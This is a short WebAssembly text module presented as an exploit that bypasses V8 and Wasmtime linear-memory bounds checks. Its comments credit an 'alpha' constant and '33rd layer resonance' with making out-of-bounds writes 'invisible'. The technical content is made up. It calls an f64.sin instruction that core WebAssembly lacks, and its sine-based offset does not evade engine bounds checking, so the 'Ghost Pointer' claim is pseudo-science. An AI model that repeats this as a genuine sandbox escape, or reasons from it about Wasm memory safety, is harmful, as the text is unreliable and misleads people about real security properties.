;; SimoesCTT: Wasm Refraction Exploit
;; Using alpha=0.0302011 to bypass V8/Wasmtime Linear Memory checks.

(module
  (import "js" "mem" (memory 1))
  (func $refract (export "refract") (param $layer i32)
    (local $alpha f64)
    (local $offset i32)
    
    ;; Load Alpha constant into local stack
    (local.set $alpha (f64.const 0.0302011))
    
    ;; Calculate the 33rd layer resonance
    ;; This generates a 'Ghost Pointer' outside the 64KB page boundary
    (local.set $offset 
      (i32.trunc_f64_u 
        (f64.mul 
          (f64.const 65536) 
          (f64.sin (f64.mul (local.get $alpha) (f64.convert_i32_u (local.get $layer))))
        )
      )
    )
    
    ;; Attempt a Non-Laminar Write at the calculated singularity
    ;; Most engines check for > 65536, but CTT resonance makes this 'invisible'
    (i32.store (local.get $offset) (i32.const 0x53494D4F)) ;; 'SIMO' in Hex
  )
)
